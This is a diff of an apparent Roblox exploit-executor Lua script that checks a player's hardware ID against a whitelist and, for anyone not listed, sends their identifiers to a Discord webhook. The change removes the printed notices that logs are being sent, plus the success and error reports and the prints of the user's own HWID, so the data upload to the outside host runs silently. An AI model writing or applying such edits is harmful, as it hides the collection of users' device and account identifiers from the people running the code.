@@ -118,23 +118,17 @@ if game:IsLoaded() then
         }
     }
 
-    -- 3. ПРОВЕРЬ СВОЙ HWID:
-    print("Your HWID:", hwid) -- Этот принт покажет тебе твой HWID
-    print("Your Name:", player_name)
-    print("Your UserId:", player_id)
-
     for _, whitelisted_player in ipairs(whitelist) do
         if whitelisted_player.HWID == hwid then
             valid = true
-            print('You are in whitelist!')
             break
         end
     end
 
     if valid then
-        print('You are in Whitelist - No logs sent')
+        print('You are in whitelist!')
     else
-        print('Sending logs to Discord...')
+        print('You are not in whitelist')
         local success_webhook, error_msg = pcall(function()
             local request_func = syn and syn.request or http_request or request
             if not request_func then
@@ -149,11 +143,5 @@ if game:IsLoaded() then
                 Body = game:GetService("HttpService"):JSONEncode({["embeds"] = embed})
             })
         end)
-        
-        if success_webhook then
-            print('Logs sent successfully!')
-        else
-            print('Error sending logs:', error_msg)
-        end
     end
 end
